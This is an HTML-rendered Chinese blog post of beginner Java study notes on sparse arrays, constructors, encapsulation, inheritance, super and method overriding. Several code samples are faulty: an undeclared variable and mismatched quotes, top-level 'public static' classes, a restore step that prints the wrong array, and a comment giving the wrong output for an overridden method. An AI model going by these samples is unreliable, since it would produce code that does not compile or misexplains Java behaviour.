class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayDemo08</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.创建一个二维数组11*11   0：没有</span></span><br><span class="line">        <span class="type">int</span>[][] array1 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">11</span>][<span class="number">11</span>];</span><br><span class="line">        array1[<span class="number">2</span>][<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">        array1[<span class="number">3</span>][<span class="number">4</span>] = <span class="number">1</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;输出原始的数组&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] ints : array1) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> anInt : ints) &#123;</span><br><span class="line">                System.out.print(anInt + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//转换为稀疏数组</span></span><br><span class="line">        <span class="comment">//获取有效值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">11</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">11</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (array1[i][j] != <span class="number">0</span>) &#123;</span><br><span class="line">                    sum++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;&#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;有效值的个数：&quot;</span> + sum);</span><br><span class="line">            <span class="comment">//2.创建一个稀疏数组的数组</span></span><br><span class="line">            <span class="type">int</span>[][] array2 = <span class="keyword">new</span> <span class="title class_">int</span>[sum + <span class="number">1</span>][<span class="number">3</span>];</span><br><span class="line">            array2[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">11</span>;</span><br><span class="line">            array2[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">11</span>;</span><br><span class="line">            array2[<span class="number">0</span>][<span class="number">2</span>] = sum;</span><br><span class="line">            <span class="comment">//遍历二维数组，将非零值，存放在稀疏数组中</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; array1.length; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; array1[i].length; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (array1[i][j] != <span class="number">0</span>) &#123;</span><br><span class="line">                        count++;</span><br><span class="line">                        array2[count][<span class="number">0</span>] = i;</span><br><span class="line">                        array2[count][<span class="number">1</span>] = j;</span><br><span class="line">                        array2[count][<span class="number">2</span>] = array1[i][j];</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//输出数组</span></span><br><span class="line">            System.out.println(<span class="string">&quot;稀疏数组&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; array2.length; i++) &#123;</span><br><span class="line">                System.out.println(array2[i][<span class="number">0</span>] + <span class="string">&quot;\t&quot;</span></span><br><span class="line">                        + array2[i][<span class="number">1</span>] + <span class="string">&quot;\t&quot;</span></span><br><span class="line">                        + array2[i][<span class="number">2</span>] + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;---------&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;还原&quot;</span>);</span><br><span class="line">            <span class="comment">//1.读取稀疏数组</span></span><br><span class="line">            <span class="type">int</span>[][] array3 = <span class="keyword">new</span> <span class="title class_">int</span>[array2[<span class="number">0</span>][<span class="number">0</span>]][array2[<span class="number">0</span>][<span class="number">1</span>]];</span><br><span class="line">            <span class="comment">//2.给其中的元素还原他的值</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; array2.length; i++) &#123;</span><br><span class="line">                array3[array2[i][<span class="number">0</span>]][array2[i][<span class="number">1</span>]] = array2[i][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//3.打印</span></span><br><span class="line">            System.out.println(<span class="string">&quot;输出还原数组&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span>[] ints : array1) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> anInt : ints) &#123;</span><br><span class="line">                    System.out.print(anInt + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="面向对象">
          <a href="#面向对象" class="heading-link"><i class="fas fa-link"></i></a><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2>
      <p>java的核心思想是oop</p>
<p>面向过程思想：步骤简单清晰，第一步干什么，第二步干什么。。。</p>
<p>面对过程适合吃力一些较为简单的问题</p>
<p>面向对象思想：物以类聚，分类的的思维模式，思考问题首先为一解决文艺需要哪些分类，然后对这些分类进行单独思考，最后才对某个分类下的细节进行面向过程的思索</p>
<p>对于描述复杂的失误，为了从宏观上把握，从整体上合理分析，我们需要使用面向对象的思路来分析整个系统。但是具体到围观操作，仍然需要面向过程的思路去处理。</p>
<p>面向对象编程（object-Oriented Programming,OOP)</p>
<p>面向过程编程的本质就是：以类的方式组织代码，以对象的组织（封装）数据。</p>
<p>抽象</p>
<p>三大特性：封装   继承  多态</p>
<p>从认识论的角度考虑的是现有对象后有类。对象，是具体的事物。类是抽象的，是对对象的抽象</p>
<p>从代码运行角度考虑是先有类后有对象。类是对象的模板</p>

        <h3 id="回顾方法的调用">
          <a href="#回顾方法的调用" class="heading-link"><i class="fas fa-link"></i></a><a href="#回顾方法的调用" class="headerlink" title="回顾方法的调用"></a>回顾方法的调用</h3>
      <p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230826144121984.png"></p>
<p>####静态方法与非静态方法的一些不同</p>
<p>静态方法是和类一起加载的，有类就有静态方法，而非静态方法是类实例后才存在的</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static void a()&#123;</span><br><span class="line"> b()</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">public  static void b()&#123;</span><br><span class="line">a()</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>都是静态方法的情况下可以互相引用</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static void a()&#123;</span><br><span class="line">    b();//报错</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">public  void b()&#123;</span><br><span class="line">a();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>a为静态方法，b为非静态方法的情况下，a没法引用b。b可以引用a</p>

        <h4 id="创建与初始化对象">
          <a href="#创建与初始化对象" class="heading-link"><i class="fas fa-link"></i></a><a href="#创建与初始化对象" class="headerlink" title="创建与初始化对象"></a>创建与初始化对象</h4>
      <p>使用new关键字创建对象</p>
<p>使用new关键字创建的时候，出了分配内存空间之外，还会给创建好的对象进项默认的初始化以及对类中构造器的调用。</p>
<p>类中的构造器也成为了构造方法，是在进行创建爱你对象的时候必须要调用的。并且构造器有以下俩个特点:1.必须和类的名字相同2.必须没有返回类型，也不能写void</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//类：；抽象  实例化</span></span><br><span class="line">        <span class="comment">//类实例化后会返回一个自己的对象</span></span><br><span class="line">        <span class="comment">//student对象就是个Student</span></span><br><span class="line">        Student lzx=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        Student ds=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        lll.name=<span class="string">&quot;111;</span></span><br><span class="line"><span class="string">        ds.name=&quot;</span>杜顺<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        lzx.age=99;</span></span><br><span class="line"><span class="string">        ds.age=100;</span></span><br><span class="line"><span class="string">        System.out.println(ds.name+&quot;</span>喜欢<span class="string">&quot;+lll.name);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></div></figure>

<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="comment">//属性：字段</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">study</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name+<span class="string">&quot;在学习&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>####构造器详解</p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230826154923945.png"></p>
<p>Person文件下明明没有方法，但application下却实例化成功，在生成的class文件下出现了一个方法，<img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230826155050161.png"></p>
<p>使用new关键字，本质是调用构造器</p>
<p>如果存在了有参构造，无参构造就必须显示构造</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.lang.model.element.NestingKind;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=<span class="string">&quot;wawakaka&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//有参构造</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Person wa=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;1111&quot;</span>);</span><br><span class="line">        System.out.println(wa.name);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>alt+insert（我的在f12旁边）快速插入构造器</p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230826164130590.png" alt="image-20230826164130590"></p>

        <h4 id="封装">
          <a href="#封装" class="heading-link"><i class="fas fa-link"></i></a><a href="#封装" class="headerlink" title="封装"></a>封装</h4>
      <p>该露的露，该藏的藏</p>
<p>我们程序设计要追求“高内聚，低耦合”。高内聚就是类的内部书记操作细节自己完成，不允许外部干涉；低耦合，仅暴露少量的方法给外部使用。</p>
<p>封装（数据的隐藏)</p>
<p>通常，应金制直接访问一个对象中数据的实际表示，而应通过操作接口来访问，这成为信息隐藏</p>
<p>属性私有，get&#x2F;set</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.Demo04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="comment">//属性私有</span></span><br><span class="line">    <span class="keyword">private</span> String name;<span class="comment">//姓名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id ;<span class="comment">//学号</span></span><br><span class="line">    <span class="keyword">private</span>  <span class="type">char</span> sex;<span class="comment">//性别</span></span><br><span class="line">    <span class="keyword">private</span>  <span class="type">int</span> age;<span class="comment">//年龄</span></span><br><span class="line">    <span class="comment">//提供一些可以操作这个属性的方法！</span></span><br><span class="line">    <span class="comment">//听过一些public的一些get/set的方法</span></span><br><span class="line">    <span class="comment">//get获得这个数据</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//set 给这个数据设置值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">char</span> sex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (age&gt;<span class="number">12</span>&amp;&amp;age&lt;<span class="number">24</span>)&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            age=<span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.Demo04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.oop.Demo04.Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Student s1=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        s1.setName(<span class="string">&quot;杜顺&quot;</span>);</span><br><span class="line">        s1.setAge(<span class="number">33</span>);</span><br><span class="line">        System.out.println(s1.getAge(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>封装的意义：</p>
<p>1.提高程序的安全性，保护数据</p>
<p>2.隐藏代码的实现细节</p>
<p>3.统一接口</p>
<p>4.系统了维护增加了</p>

        <h4 id="继承">
          <a href="#继承" class="heading-link"><i class="fas fa-link"></i></a><a href="#继承" class="headerlink" title="继承"></a>继承</h4>
      <p>继承的本质是对某一批类的抽象，从而实现对现实世界更好的建模。<br>extands的意思是“扩展”。子类是父类的扩展。<br>JAVA中类只有单继承，没有多继承!<br>继承是类和类之间的一种关系。除此之外,类和类之间的关系还有依赖、组合、聚合等。<br>继承关系的俩个类，一个为子类(派生类),一个为父类(基类)。子类继承父类,使用关键字extends来表示。子类和父类之间,从意义上讲应该具有”is a”的关系.<br>object类<br>super</p>
<p>方法重写</p>
<p>####Super详解</p>
<p>application</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.oop.Demo05.Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>   <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.test(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>student</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.Demo05;</span><br><span class="line"><span class="comment">//子类</span></span><br><span class="line"><span class="comment">//继承了父类，就会拥有父类的全部方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name=<span class="string">&quot;qingchu&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(String name)</span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(name);<span class="comment">//11</span></span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name);<span class="comment">//qingchu</span></span><br><span class="line">        System.out.println(<span class="built_in">super</span>.name);<span class="comment">//qingchuan</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>person</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.Demo05;</span><br><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="comment">//在Java中，所有的类都直接或者间接继承object类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span>   String name=<span class="string">&quot;qingchuan&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Person&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>super注意点:</p>
<ol>
<li>super调用父类的构造方法，必须在构造方法的第一个2. super 必须只能出现在子类的方法或者构造方法中!3. super和 this 不能同时调用构造方法!<br>vs this:<br>代表的对象不同:<br>this:本身调用者这个对象super:代表父类对象的应用前提<br>this:没哟继承也可以使用<br>super:只能在继承条件才可以使用构造方法<br>this() ;本类的构造super():父类的构造!</li>
</ol>

        <h4 id="方法重写（子父类之间）">
          <a href="#方法重写（子父类之间）" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法重写（子父类之间）" class="headerlink" title="方法重写（子父类之间）"></a>方法重写（子父类之间）</h4>
      <p>静态的</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.oop.Demo05.A;</span><br><span class="line"><span class="keyword">import</span> com.oop.Demo05.B;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>   <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//方法的调用之和左边，定义的数据类型</span></span><br><span class="line">        <span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        a.test();<span class="comment">//A</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//父类的引用指向了子类</span></span><br><span class="line">        B b=<span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        b.test();<span class="comment">//B</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.Demo05;</span><br><span class="line"><span class="comment">//继承</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">extends</span> <span class="title class_">B</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;A=&gt;test()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.Demo05;</span><br><span class="line"><span class="comment">//重写是方法的重写，与属性无关</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;B=&gt;test()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>非静态</p>
